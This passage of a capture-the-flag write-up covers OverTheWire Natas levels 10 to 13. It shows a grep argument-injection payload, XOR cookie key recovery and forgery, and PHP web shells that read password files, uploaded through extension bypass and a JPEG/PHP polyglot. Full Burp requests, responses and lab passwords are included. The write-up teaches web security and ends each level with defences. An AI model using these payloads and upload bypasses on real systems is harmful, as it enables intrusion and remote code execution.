(and many other words that contain letter 'a' inside the dictionary.txt)
```

As the payload `a /etc/natas_webpass/natas11` is used, the executed command becomes: 
```
grep -i a /etc/natas_webpass/natas11 dictionary.txt
```
which returns the words that have letter `a` in both /etc/natas_webpass/natas11 and dictionary.txt


### Analysis
This level demonstrates an incomplete command injection mitigation, where the application attempts to filter dangerous characters but fails to fully secure the command execution.

Although characters like ;, |, and & are blocked, the application still allows user input to control the structure of the command. By injecting an additional file path (/etc/natas_webpass/natas11), it is possible to manipulate the behavior of the grep command without using restricted characters.

In this case, grep accepts multiple file arguments:
```
grep -i a file1 file2
```
This causes the command to search both files and display their contents if matches are found. Since the password file contains the letter a, its content is revealed.

This highlights that blacklist-based filtering is insufficient for preventing command injection. Attackers can often bypass such filters using alternative techniques. Proper defenses should include strict input validation, command escaping, or avoiding shell execution entirely.


<br><br><br><br><br>







## Natas 11
```
URL: http://natas11.natas.labs.overthewire.org
Username: natas11
Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
After login, the webpage displayed a message `Cookies are protected with XOR encryption` and an input field labeled **“Background color:”**, along with a `Set color` button. Default input `#ffffff` and initial testing with sample value such as `#000000`is performed. The default input will remain the backgrond color of the page as white color, but the value `#000000` will change the background color to black. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding 
By analyzing the source code, it was identified that the default data structure:
```php
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
```
is used to generate a cookie through the following function:
```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```
To understand how the json_encode() output appears, a simple PHP test was conducted through php sandbox (https://onlinephp.io/):
```php
<?php
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$tempdata = json_encode($defaultdata);
echo $tempdata;
?>
```
This produces the following JSON string:
```php
{"showpassword":"no","bgcolor":"#ffffff"}
```
This value serves as the plaintext in the encryption process.

Next, the plaintext is encrypted using the xor_encrypt() function with an unknown key. The result is then encoded using Base64 to produce the cookie value:
```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
```
This value can be treated as the **ciphertext**.

To solve the challenge, it is necessary to recover the XOR key. The process can be summarized as follows:
1. json_encode($d) → plaintext
2. plaintext ⊕ key → intermediate value
3. Base64 encode → cookie (ciphertext)

Thus:
```
plaintext ⊕ key = Base64 decode(cookie)
```
Using XOR properties:
- plaintext ⊕ key = ciphertext
- plaintext ⊕ ciphertext = key
- ciphertext ⊕ plaintext = key

In this case, the most reliable approach is:
```
key = ciphertext ⊕ plaintext
```
This method is preferred because the plaintext is fully known and does not contain ambiguity.

Additionally, directly using the decoded cookie as a key is not practical because it may:
- contain non-printable characters
- be difficult to handle or copy accurately
- introduce encoding inconsistencies (e.g., UTF-8 vs raw bytes)

Therefore, deriving the key using known plaintext provides a more stable and accurate result.


### Approach 
The request and response were intercepted using Burp Suite for further analysis.
The request content is: 
```
GET / HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
Upgrade-Insecure-Requests: 1
```

The response content is: 
```
HTTP/1.1 200 OK
Date: Mon, 13 Apr 2026 11:33:24 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
Vary: Accept-Encoding
Content-Length: 1085
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" };</script></head>

<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The captured request contained the following cookie:
```http
Cookie: ...; data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
```
The server response also confirmed that the same cookie value was being used. This indicates that the data cookie stores the encrypted user data.

#### Key Recovery Using CyberChef
To recover the XOR key, CyberChef was used with the following steps:
1. Input the cookie value: `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=`
2. Apply Base64 Decode to obtain the raw XOR-encrypted data
3. Perform XOR using the known plaintext: `{"showpassword":"no","bgcolor":"#ffffff"}`
4. The resulting output revealed a repeating key stream: `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`
5. From this pattern, the XOR key was identified as: `eDWo`

#### Cookie Manipulation
1. After recovering the key, a modified plaintext was constructed: `{"showpassword":"yes","bgcolor":"#ffffff"}`
2. The modified data was then XOR-encrypted using the key `eDWo`
3. Base64 encoded
4. URL encoded
5. Resulting in the following cookie value: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`

#### Exploitation
The original request was sent to Repeater in Burp Suite, and the data cookie was replaced with the modified value.

Below are the response obtained after modified request is sent:
```
GET / HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
Upgrade-Insecure-Requests: 1
```

after sending the request, the following response is obtained: 
```
HTTP/1.1 200 OK
Date: Mon, 13 Apr 2026 13:04:15 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
Vary: Accept-Encoding
Content-Length: 1149
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" };</script></head>

<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
After resending the request, the server returned:
```
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
This confirms that modifying the encrypted cookie successfully altered the application’s behavior and revealed the password.


### Analysis
This level demonstrates a **weak encryption implementation using XOR with a repeating key**. Since XOR is reversible, and part of the plaintext is known (default JSON structure), it is possible to recover the encryption key using: `key = ciphertext XOR plaintext`.

Once the key is obtained, attackers can forge arbitrary cookie values and manipulate application behavior. In this case, modifying `"showpassword"` to `"yes"` allowed the application to reveal the password for the next level. This highlights that XOR with a repeating key is not secure for protecting sensitive data. Proper cryptographic mechanisms with secure key management should be used instead.


<br><br><br><br><br>







## Natas 12
```
URL: http://natas12.natas.labs.overthewire.org
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
After login, the webpage displayed a message `Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding 
By analyzing the source code, it was identified that the application determines the uploaded file’s extension based on the filename parameter in the POST request:
```php
$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
```
The extension is extracted using:
```php
$ext = pathinfo($fn, PATHINFO_EXTENSION);
```
This means the server trusts user-controlled input (filename) to decide the file extension, instead of validating the actual uploaded file content. This introduces a **file upload vulnerability**.

To test this, a PHP file was created:
```php
<?php passthru("cat /etc/natas_webpass/natas13"); ?>
```
The file was uploaded as test.php.

#### Request Content
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------39261964973491093391103850610
Content-Length: 533
Origin: http://natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Connection: keep-alive
Referer: http://natas12.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------39261964973491093391103850610
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------39261964973491093391103850610
Content-Disposition: form-data; name="filename"

m37cmsbfkf.jpg
-----------------------------39261964973491093391103850610
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: application/x-php

<?php passthru("cat /etc/natas_webpass/natas13"); ?>

-----------------------------39261964973491093391103850610--
```

#### Response Content 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 11:30:51 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 976
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/zj53xxdrgw.jpg">upload/zj53xxdrgw.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The browser returned: `The file upload/zj53xxdrgw.jpg has been uploaded`. After clicking the link `upload/zj53xxdrgw.jpg`, it navigate to `http://natas12.natas.labs.overthewire.org/upload/zj53xxdrgw.jpg` and return the content `The image "http://natas12.natas.labs.overthewire.org/upload/zj53xxdrgw.jpg" cannot be displayed because it contains errors. This indicate that accessing the file resulted in an error because it was saved with a .jpg extension, so the PHP code was not executed.



### Approach 
To exploit this vulnerability, the filename parameter was modified in the request from: `m37cmsbfkf.jpg` to `m37cmsbfkf.php`
#### Modified Request content
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------382083169937517457761950657471
Content-Length: 539
Origin: http://natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Connection: keep-alive
Referer: http://natas12.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------382083169937517457761950657471
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------382083169937517457761950657471
Content-Disposition: form-data; name="filename"

m37cmsbfkf.php
-----------------------------382083169937517457761950657471
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: application/x-php

<?php passthru("cat /etc/natas_webpass/natas13"); ?>

-----------------------------382083169937517457761950657471--
```

#### Response content: 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 11:44:58 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 976
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/iupdauyikc.php">upload/iupdauyikc.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

At the browser, we get `The file upload/iupdauyikc.php has been uploaded`. After clikced the link, we navigate to `http://natas12.natas.labs.overthewire.org/upload/iupdauyikc.php` and the webpage returned `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`, which is the password for next challenge. 


### Analysis
This level demonstrates a file upload vulnerability caused by improper validation. The application relies on a user-supplied parameter (filename) to determine the file extension, rather than validating the actual file type or restricting executable content.

By modifying the file extension to .php, it was possible to upload and execute arbitrary server-side code, leading to remote code execution (RCE).

This highlights several important security issues:
- Trusting user input for file handling is dangerous
- File extensions alone are not sufficient for validation
- Uploaded files should never be executed directly

Proper defenses include:
- Validating file content (MIME type and magic bytes)
- Restricting executable file types
- Storing uploads outside the web root
- Renaming files securely on the server


<br><br><br><br><br>







## Natas 13
```
URL: http://natas13.natas.labs.overthewire.org
Username: natas13
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 
```
After login, the webpage displayed a message `For security reasons, we now only accept image files! Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
Compared to the previous level, an additional validation is introduced:
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```
This means the application now verifies whether the uploaded file is a valid image by checking its magic bytes (file signature) instead of relying only on file extension.

Attempting to upload a PHP file directly with the following content:
```php
<?php passthru("cat /etc/natas_webpass/natas14"); ?>
```
Resulted in the error: `File is not an image`. This confirms that simple file extension bypass is no longer sufficient.

#### Attemtp to upoad an image file using burpsuite: 
##### Request Content: 
```
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------35342147994429824884085540906
Content-Length: 10803
Origin: http://natas13.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==
Connection: keep-alive
Referer: http://natas13.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="filename"

f6t50p8hv5.jpg
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
Content-Type: image/jpeg

ÿØÿàJFIF
5&&--5-/-2/-----------------------------------------+
(content of the image files ...)
-----------------------------35342147994429824884085540906--
```

Uploading a valid JPEG file (e.g., picture1.jpeg) succeeds, provided the file size is below 1KB.

Note: If the error The uploaded file exceeds MAX_FILE_SIZE occurs, the JPEG content can be reduced by deleting some content of the image file using Burp Suite. However, the JPEG header and footer must remain intact, otherwise the file will fail validation.


##### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 12:14:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1041
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/ij0jriwn0n.jpg">upload/ij0jriwn0n.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

After the file with <1KB is successfully uploaded, the browser returned: 
```
The file upload/ij0jriwn0n.jpg has been uploaded
```

After clicking the link `upload/ij0jriwn0n.jpg`, we navigate to `http://natas13.natas.labs.overthewire.org/upload/ij0jriwn0n.jpg` and see the picture we uploaded. 


### Approach 
To bypass the exif_imagetype() check, a polyglot file was created — a file that is both a valid JPEG and contains embedded PHP code.
1. Start with a valid JPEG file (to satisfy exif_imagetype())
2. Inject PHP code inside the file content: `<?php passthru("cat /etc/natas_webpass/natas14"); ?>`
3. Ensure the JPEG header (ÿØÿàJFIF) remains intact
4. Modify the request in Burp Suite:
   - Change filename from `.jpg` → `.php`
   - Change Content-Type → `application/x-php`

#### Modified Request Content: 
```
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------35342147994429824884085540906
Content-Length: 1360
Origin: http://natas13.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==
Connection: keep-alive
Referer: http://natas13.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="filename"

f6t50p8hv5.php
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
Content-Type: application/x-php

ÿØÿàJFIF
5&&--5-/-2/-----------------------------------------+
... (image content) ...
<?php passthru("cat /etc/natas_webpass/natas14"); ?>
... (image content) ...
-----------------------------35342147994429824884085540906--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 12:29:14 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1041
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

